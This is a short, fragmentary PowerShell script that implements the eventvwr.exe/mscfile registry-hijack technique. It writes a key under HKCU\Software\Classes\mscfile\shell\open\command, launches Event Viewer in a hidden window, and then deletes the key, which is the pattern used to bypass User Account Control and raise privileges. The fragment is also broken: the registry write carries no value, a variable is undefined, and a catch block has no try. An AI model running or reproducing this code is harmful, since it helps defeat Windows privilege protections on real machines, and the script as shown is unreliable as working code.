  powershell
 $wscript = new-object -ComObject WScript.Shell;
$hkey = ‘HKCU\Software\Classes\mscfile\shell\open\command\’;
 $sleep = 3000;
 $wscript.RegWrite($hkey);
 Start-Sleep -m $sleep;
 Start-Process -WindowStyle hidden -FilePath ‘eventvwr.exe’; 
 Start-Sleep -m $sleep;
 $wscript.RegDelete($hkey);
$process = Get-Process $name -ErrorAction silentlycontinue;
  catch{write-host $_.Exception.Message;}
